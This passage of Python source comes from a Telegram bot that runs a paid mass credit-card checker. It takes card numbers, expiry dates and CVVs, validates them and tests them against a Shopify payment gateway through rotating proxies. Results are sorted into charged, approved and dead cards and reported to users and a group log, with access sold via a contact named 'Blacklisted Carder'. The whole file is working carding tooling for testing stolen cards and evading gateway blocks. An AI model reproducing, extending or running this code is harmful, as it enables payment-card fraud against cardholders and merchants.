                "ERROR" in message_upper
                or "TIMEOUT" in message_upper
                or "error" in message_lower
            ):
                result_status = "ERROR"
                response_msg = message
                break

            # ── 6. Proxy / retry / unknown ───────────────────────
            # Handle proxy errors and any other retryable failures
            # not caught by RETRY_ERRORS (rare edge cases).
            else:
                is_proxy_error = proxy_manager.is_real_proxy_error(message, http_status)

                if is_proxy_error:
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"
                        response_msg = f"Proxy Error: {message}"
                        break
                    else:
                        # Small jittered backoff so concurrent workers don't
                        # all wake at the same instant after a proxy failure.
                        await asyncio.sleep(0.15 + random.uniform(0, 0.15))
                        continue

                # Fallback for anything else: API success flag determines
                # final status. (RETRY_ERRORS matches are now handled in
                # step 4 above — no need to check again here.)
                else:
                    if success is False:
                        result_status = "DEAD"
                    else:
                        result_status = "ERROR"
                    response_msg = message
                    break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)

            if attempt == MAX_RETRIES:
                result_status = "ERROR"
                response_msg = "Connection Error"
                proxy_status_formatted = "Error 🔴"
                break
            else:
                # Short jittered backoff — previously a fixed 0.5s which
                # compounded badly across 50 concurrent failed workers.
                await asyncio.sleep(0.15 + random.uniform(0, 0.15))
                continue

    if is_session_stopped(session_id):
        return

    print(f"{cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")
    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg} | Proxy: {mask_proxy(used_proxy) if used_proxy else 'None'}")

    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted,
        'response': response_msg,
        'bin_info': bin_data,
        'price': api_price,
        'gateway': 'Shopify',
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A'
    }

    if is_session_stopped(session_id):
        return

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)

        tasks = [
            asyncio.to_thread(update_user_stats, user_id, True),
            asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name),
        ]
        if not is_admin(user_id) and not get_premium_status(user_id)[0] and not is_unlimited_msh(user_id):
            tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 2))
        await asyncio.gather(*tasks)

        if is_session_stopped(session_id):
            return

        await asyncio.gather(
            send_hit_log_to_group(bot, response_msg, user_obj, plan_name, proxy_status_formatted, api_price),
            send_charged_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name),
        )

    elif result_status == "APPROVED":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)

        tasks = [asyncio.to_thread(update_user_stats, user_id, True)]
        if not is_admin(user_id) and not get_premium_status(user_id)[0] and not is_unlimited_msh(user_id):
            tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        await asyncio.gather(*tasks)

        if is_session_stopped(session_id):
            return

        # In "charged_only" mode, skip the approved DM — user only wants charged hits
        if session.get('notify_mode') != "charged_only":
            await send_approved_msg_to_user(bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name)
    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)

        tasks = [asyncio.to_thread(update_user_stats, user_id, False)]
        if not is_admin(user_id) and not get_premium_status(user_id)[0] and not is_unlimited_msh(user_id):
            tasks.append(asyncio.to_thread(deduct_credits_atomic, user_id, 1))
        await asyncio.gather(*tasks)
    elif result_status == "ERROR":
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False)

    if is_session_stopped(session_id):
        return

    await update_progress_message(bot, session_id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id = callback_data.session_id
        result_type = callback_data.result_type

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        count = 0
        if result_type == "charged":
            count = len(session.get('charged_cards', []))
        elif result_type == "live":
            count = len(session.get('live_cards', []))
        elif result_type == "dead":
            count = len(session.get('dead_cards', []))
        else:
            count = (
                len(session.get('charged_cards', [])) +
                len(session.get('live_cards', [])) +
                len(session.get('dead_cards', [])) +
                len(session.get('error_cards', []))
            )

        if count == 0:
            type_names = {"charged": "Charged", "live": "Live", "dead": "Dead", "all": ""}
            type_name = type_names.get(result_type, "")
            await callback.answer(f"❌ No {type_name} cards found", show_alert=True)
            return

        await callback.answer("📦 Generating report...", show_alert=False)

        user_obj = session.get('user_obj')
        plan_name = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')

        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)

        file_content = file_buffer.read()
        file_buffer.seek(0)

        type_emojis = {"charged": "💎", "live": "✅", "dead": "❌", "all": "📁"}
        type_labels = {"charged": "𝗖𝗛𝗔𝗥𝗚𝗘𝗗", "live": "𝗟𝗶𝘃𝗲", "dead": "𝗗𝗲𝗮𝗱", "all": "𝗔𝗹𝗹"}

        emoji = type_emojis.get(result_type, "📁")
        label = type_labels.get(result_type, "𝗔𝗹𝗹")

        caption = (
            f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {label} {emoji}\n"
            f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <b>{total_count}</b>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗠𝗮𝘀𝘀"
        )

        document = types.BufferedInputFile(file=file_content, filename=filename)

        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id,
                document=document,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=user_msg_id
            )
        except TelegramBadRequest as e:
            err_lower = str(e).lower()
            if "message to reply not found" in err_lower or "reply message not found" in err_lower:
                try:
                    document.seek(0)
                except Exception:
                    document = types.BufferedInputFile(file=file_content, filename=filename)
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise

    except Exception as e:
        logging.error(f"Error handling result callback: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except:
            pass

@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id

        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if is_buttons_locked(session_id):
            remaining = get_remaining_lock(session_id)
            await callback.answer(f"⏳ Please wait {remaining} seconds before using buttons", show_alert=True)
            return

        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True)
            return

        session['status'] = "STOPPED"

        print(f"🛑 [MSH] Stop signal sent")
        logging.info(f"🛑 [MSH] Stop signal sent")

        cancelled_count = 0
        for task in session.get('tasks', []):
            if not task.done():
                task.cancel()
                cancelled_count += 1

        await callback.answer("🛑 Stopping...", show_alert=False)

        print(f"🛑 [MSH] Cancelled {cancelled_count} tasks")
        logging.info(f"🛑 [MSH] Cancelled {cancelled_count} tasks")

        proxy_manager = session.get('proxy_manager')
        if proxy_manager:
            stats = proxy_manager.get_stats()
            print(f"📊 [ProxyManager Stats] Total: {stats['total_proxies']}, Active: {stats['active']}, Failed: {stats['failed']}, Uses: {stats['total_uses']}")
            logging.info(f"📊 [ProxyManager Stats] {stats}")

        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)

    except Exception as e:
        logging.error(f"Error handling stop callback: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except:
            pass


@router.callback_query(MshRetryCallback.filter())
async def handle_retry_callback(callback: types.CallbackQuery, callback_data: MshRetryCallback):
    try:
        session_id = callback_data.session_id
        session = MSH_SESSIONS.get(session_id)

        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True)
            return

        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True)
            return

        if session['status'] == "CHECKING":
            await callback.answer("ℹ️ Already running", show_alert=True)
            return

        error_cards = session.get('error_cards', [])
        if not error_cards:
            await callback.answer("❌ No error cards to retry", show_alert=True)
            return

        retry_tuples = []
        for c in error_cards:
            cc_formatted = c.get('card', '')
            parts = cc_formatted.split('|')
            if len(parts) != 4:
                continue
            cc_num = parts[0]
            retry_tuples.append((cc_formatted, cc_num))

        if not retry_tuples:
            await callback.answer("❌ No valid error cards to retry", show_alert=True)
            return

        await callback.answer(f"🔁 Retrying {len(retry_tuples)} error cards...", show_alert=False)

        session['status'] = "CHECKING"
        session['total'] = len(retry_tuples)
        session['checked'] = 0
        session['approved'] = 0
        session['charged'] = 0
        session['dead'] = 0
        session['errors'] = 0
        session['live_cards'] = []
        session['dead_cards'] = []
        session['charged_cards'] = []
        session['error_cards'] = []
        session['tasks'] = []
        session['start_time'] = time.time()
        session['last_text'] = ""
        session['last_update_time'] = 0

        logging.info(f"🔁 [MSH] Retry session {session_id} - {len(retry_tuples)} error cards")

        asyncio.create_task(
            run_mass_checker(
                callback.bot,
                session_id,
                retry_tuples,
                session.get('user_obj'),
                session.get('plan_name')
            )
        )

    except Exception as e:
        logging.error(f"Error handling retry callback: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error retrying", show_alert=True)
        except:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MODE SELECTION CALLBACK (Charged Only vs Approved+Charged)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshModeCallback.filter())
async def msh_mode_callback(callback: types.CallbackQuery, callback_data: MshModeCallback):
    pending_id = callback_data.pending_id
    mode = callback_data.mode  # "charged" or "approved"

    pending = MSH_PENDING.pop(pending_id, None)
    if not pending:
        try:
            await callback.answer("⚠️ Selection expired — run /msh again.", show_alert=True)
        except Exception:
            pass
        return

    user_id = callback.from_user.id
    # Only the same user who triggered /msh can pick the mode
    if pending["user"].id != user_id:
        try:
            await callback.answer("❌ Not your check.", show_alert=True)
        except Exception:
            pass
        # Put it back so the legitimate user can still pick
        MSH_PENDING[pending_id] = pending
        return

    # Notify-mode: "charged" → suppress approved messages; "approved" → send both
    try:
        await callback.answer(
            "🔥 Charged Only" if mode == "charged" else "✅ Approved + Charged",
            show_alert=False,
        )
    except Exception:
        pass

    # Edit the prompt message to confirm the choice, then start the check
    try:
        choice_text = (
            f"🔥 <b>Charged Only</b>" if mode == "charged"
            else f"✅ <b>Approved + Charged</b>"
        )
        await callback.message.edit_text(
            f"<tg-emoji emoji-id=\"{EMOJI_CROWN}\">👑</tg-emoji> "
            f"<b>𝗠𝗼𝗱𝗲 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 ➛</b> {choice_text}\n"
            f"<i>Starting mass check…</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass

    notify_mode = "charged_only" if mode == "charged" else "all_approved"

    # Launch the actual background check with the chosen notify-mode
    asyncio.create_task(
        process_mass_check_background(
            pending["message"],
            pending["bot"],
            pending["valid_cards"],
            pending["user"],
            pending["user_proxies"],
            pending["is_group"],
            notify_mode=notify_mode,
        )
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    bot = message.bot
    admin = is_admin(user_id)

    if not admin and not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>", parse_mode="HTML")
        return

    if not admin:
        is_premium, _ = get_premium_status(user_id)
        if not is_premium:
            await message.reply(
                "💎𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.\n\n👉 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 <a href=\"https://t.me/blacklistedcarder1\">owner</a> 𝘁𝗼 𝘂𝗽𝗴𝗿𝗮𝗱𝗲.",
                parse_mode="HTML"
            )
            return

    is_checking = False
    for session_id, session_data in list(MSH_SESSIONS.items()):
        if session_data.get('user_id') == user_id and session_data.get('status') == "CHECKING":
            is_checking = True
            break

    if is_checking:
        await message.reply(
            "⚠️ <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗦𝗲𝘀𝘀𝗶𝗼𝗻</b>\n\n"
            "You have a check running.\n"
            "Use the <b>🛑 Stop</b> button to stop it.",
            parse_mode="HTML"
        )
        return

    user_proxies = await get_user_proxies(user_id)
    if not user_proxies:
        await message.reply(
            "⚠️ <b>𝗡𝗼 𝗣𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n"
            "Add proxies using <code>/proxy</code> command.",
            parse_mode="HTML"
        )
        return

    # ── Collect raw text from command, reply, caption, and/or attached file ──
    raw_text = ""

    # Command inline text (works whether the trigger came via .text or .caption)
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "

    # Text / caption from a replied-to message
    if message.reply_to_message:
        replied_msg = message.reply_to_message
        if replied_msg.text:
            raw_text += replied_msg.text + " "
        elif replied_msg.caption:
            raw_text += replied_msg.caption + " "

    # Document: prefer the current message's attachment, then a replied-to doc
    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document

    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB.")
            return
        try:
            file_info = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}")
            return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML"
        )
        return

    # ── Extract & validate cards here so we can check credits upfront ──
    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found.")
        return

    valid_cards = []
    expired_count = 0
    invalid_luhn_count = 0

    # ── Card-count cap ─────────────────────────────────────────
    # Default: 2000 cards per /msh (Telegram rate-limit safe + sane memory).
    # Admin:    unlimited (no cap, /msh accepts however many cards were sent).
    # /unlimitedchk target: 10000 cards per /msh (10× normal premium cap).
    # Premium:  same 2000 (premium is just "no credit charge", not unlimited).
    #
    # We compute the cap ONCE here, factoring in admin + unlimited_msh,
    # so the loop below applies it consistently.
    is_unl_msh_for_cap = is_unlimited_msh(user_id)
    if admin:
        MAX_VALID_CARDS = 10_000_000   # effectively unlimited for admin
    elif is_unl_msh_for_cap:
        MAX_VALID_CARDS = 10_000       # /unlimitedchk target: 10k per /msh
    else:
        MAX_VALID_CARDS = 2000        # regular + premium default

    for card_string in extracted_cards:
        if len(valid_cards) >= MAX_VALID_CARDS:
            break
        parts_c = card_string.split('|')
        if len(parts_c) != 4:
            continue
        cc, mm, yy, cvv = parts_c
        if not luhn_check(cc):
            invalid_luhn_count += 1
            continue
        if is_expired(mm, yy):
            expired_count += 1
            continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        filter_info = ""
        if expired_count > 0 or invalid_luhn_count > 0:
            filter_info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n"
        await message.reply(f"{filter_info}❌ No valid cards to check.", parse_mode="HTML")
        return

    # ── Credit check: admin and /unlimitedchk users skip this ──
    # Admins always skip (set by is_admin above). /unlimitedchk targets
    # are flagged via the `unlimited_msh` field in the users collection
    # and also skip here. Premium users still get charged unless they
    # were ALSO granted unlimited_msh by the admin.
    if not admin and not is_unl_msh_for_cap:
        is_prem_msh, _ = get_premium_status(user_id)
        if not is_prem_msh:
            current_credits = await asyncio.to_thread(get_user_credits, user_id)
            if current_credits < total_cards:
                await message.reply(
                    f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
                    f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
                    f"Your balance: <b>{current_credits}</b> credits.\n\n"
                    f"Please add more credits or reduce the number of cards.",
                    parse_mode="HTML"
                )
                return

    # Detect if the command was sent from a group or supergroup
    is_group = message.chat.type in ("group", "supergroup", "channel")

    # ── Ask user to pick a notify mode before launching ──
    pending_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    MSH_PENDING[pending_id] = {
        "message": message,
        "bot": bot,
        "valid_cards": valid_cards,
        "user": user,
        "user_proxies": user_proxies,
        "is_group": is_group,
        "total_cards": total_cards,
    }

    crown  = f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji>'
    fire   = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'
    blue   = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

    prompt_text = (
        f"{crown} <b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ➛ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗠𝗼𝗱𝗲</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>Cards Ready ➛</b> <code>{total_cards}</code>\n"
        f"<b>Gateway ➛</b> Shopify\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{fire} <b>Charged Only</b> — notify only on real charges\n"
        f"{blue} <b>All Approved</b> — notify on approved + charged\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"{crown} <b><a href=\"https://t.me/blacklistedcarder1\">Blacklisted Carder</a></b>"
    )

    mode_kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="Charged Only",
                callback_data=MshModeCallback(pending_id=pending_id, mode="charged").pack(),
                style="primary",
                icon_custom_emoji_id=CUSTOM_CHARGED_EMOJI_ID,
            ),
        ],
        [
            InlineKeyboardButton(
                text="Approved + Charged",
                callback_data=MshModeCallback(pending_id=pending_id, mode="approved").pack(),
                style="success",
                icon_custom_emoji_id=CUSTOM_APPROVED_EMOJI_ID,
            ),
        ],
    ])

    await message.reply(prompt_text, parse_mode="HTML", reply_markup=mode_kb, disable_web_page_preview=True)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(
    message: types.Message,
    bot: Bot,
    valid_cards: list,
    user_obj,
    user_proxies,
    is_group: bool = False,
    notify_mode: str = "all_approved",  # "charged_only" | "all_approved"
):
    """
    Receives a pre-validated list of (card_string, cc_num) tuples.
    Card extraction, Luhn/expiry validation, and credit checks are all
    performed upfront in msh_command before this task is launched.
    """
    user_id = user_obj.id
    chat_id = message.chat.id

    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("❌ No valid cards to check.", parse_mode="HTML")
        return

    session_id = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name = await get_user_plan_name(user_id)

    proxy_manager = ProxyManager(user_proxies, session_id)
    proxy_stats = proxy_manager.get_stats()

    logging.info(f"🔄 [MSH] Session {session_id} initialized with ProxyManager: {proxy_stats['total_proxies']} proxies (normalized)")

    initial_text = _build_progress_caption(
        {
            "status": "CHECKING",
            "start_time": time.time(),
            "checked": 0,
            "total": total_cards,
            "approved": 0,
            "charged": 0,
            "dead": 0,
            "errors": 0,
            "proxy_manager": proxy_manager,
        },
        session_id,
    )

    initial_buttons = get_result_buttons(session_id, is_running=True)

    progress_msg = await message.reply(initial_text, parse_mode="HTML", reply_markup=initial_buttons)

    MSH_SESSIONS[session_id] = {
        "session_id": session_id,
        "status": "CHECKING",
        "chat_id": chat_id,
        "user_id": user_id,
        "msg_id": progress_msg.message_id,
        "user_msg_id": message.message_id,
        "total": total_cards,
        "checked": 0,
        "approved": 0,
        "charged": 0,
        "dead": 0,
        "errors": 0,
        "start_time": time.time(),
        "tasks": [],
        "proxies": user_proxies,
        "proxy_manager": proxy_manager,
        "bad_proxies": [],
        "last_text": "",
        "last_update_time": 0,
        "live_cards": [],
        "dead_cards": [],
        "charged_cards": [],
        "error_cards": [],
        "user_obj": user_obj,
        "plan_name": plan_name,
        "is_group": is_group,  # Track whether started from a group
        "notify_mode": notify_mode,  # "charged_only" | "all_approved"
    }

    print(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group}")
    logging.info(f"🚀 [MSH] Started - {total_cards} cards - User: {user_id} - Proxies: {len(user_proxies)} - Group: {is_group}")

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))

async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session: return

    user_sem = asyncio.Semaphore(_PER_USER_API_CONCURRENCY)

    async def process_one(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with user_sem:
            if is_session_stopped(session_id):
                return
            await _adaptive_api_throttle()
            if is_session_stopped(session_id):
                return
            async with _GLOBAL_API_SEMAPHORE:
                if is_session_stopped(session_id):
                    return
                try:
                    await process_single_card(
                        session_id, cc_formatted, cc_num,
                        session['user_id'], bot, user_obj, plan_name
                    )
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    if not is_session_stopped(session_id):
                        logging.error(f"Worker error for {cc_formatted}: {e}")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # SLIDING-WINDOW TASK SPAWN (producer-consumer)
    #
    # Previously every card was wrapped in an asyncio.Task at t=0, so
    # 2000 tasks all entered the worker() immediately. Even though
    # only N ran concurrently (semaphore-limited), ALL 2000 of them
    # ran `_adaptive_api_throttle()` → did a 300-entry deque scan
    # → scheduled a 20-150ms sleep timer. That's ~2000 wasted deque
    # scans + 2000 sleep timers at startup, multiplied across 15
    # concurrent users → huge wasted CPU and event-loop pressure.
    #
    # Now: keep `_PER_USER_API_CONCURRENCY` long-lived worker tasks.
    # Each worker grabs the next card from an asyncio.Queue when it
    # becomes free. Only the workers that are about to call the API
    # do the throttle work — others just sit waiting on the queue
    # (free, zero CPU). This eliminates the startup thundering-herd
    # WITHOUT raising concurrency caps → no extra API load.
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    queue: asyncio.Queue = asyncio.Queue()
    sentinel = None  # poison pill to tell workers to exit
    for card_tuple in cards:
        queue.put_nowait(card_tuple)

    print(f"📋 [MSH] {queue.qsize()} cards queued for {session_id}")
    logging.info(f"📋 [MSH] {queue.qsize()} cards queued for {session_id}")

    async def worker_loop():
        try:
            while True:
                if is_session_stopped(session_id):
                    return
                item = await queue.get()
                if item is sentinel:
                    queue.task_done()
                    return
                cc_formatted, cc_num = item
                try:
                    await process_one(cc_formatted, cc_num)
                finally:
                    queue.task_done()
        except asyncio.CancelledError:
            return

    # Spawn long-lived workers (one per concurrency slot)
    workers = [
        asyncio.create_task(worker_loop(), name=f"msh_w_{session_id}_{i}")
        for i in range(_PER_USER_API_CONCURRENCY)
    ]
    session['tasks'].extend(workers)

    # Wait for queue to drain or session to be stopped
    try:
        await queue.join()
    except asyncio.CancelledError:
        pass

    # Signal workers to exit
    for _ in workers:
        try:
            queue.put_nowait(sentinel)
        except Exception:
            pass

    # Cancel any workers still alive (e.g. on stop)
    for w in workers:
        if not w.done():
            w.cancel()

    # Drain worker exits
    results = await asyncio.gather(*workers, return_exceptions=True)
    cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
    errors = sum(
        1 for r in results
        if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError)
    )
    if cancelled > 0:
        print(f"🛑 [MSH] {cancelled} worker(s) cancelled")
    if errors > 0:
        logging.error(f"[MSH] {errors} worker(s) failed with exceptions")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"

    await update_progress_message(bot, session_id)

    print(f"✅ [MSH] Session {session_id} finished")
    logging.info(f"✅ [MSH] Session {session_id} finished")
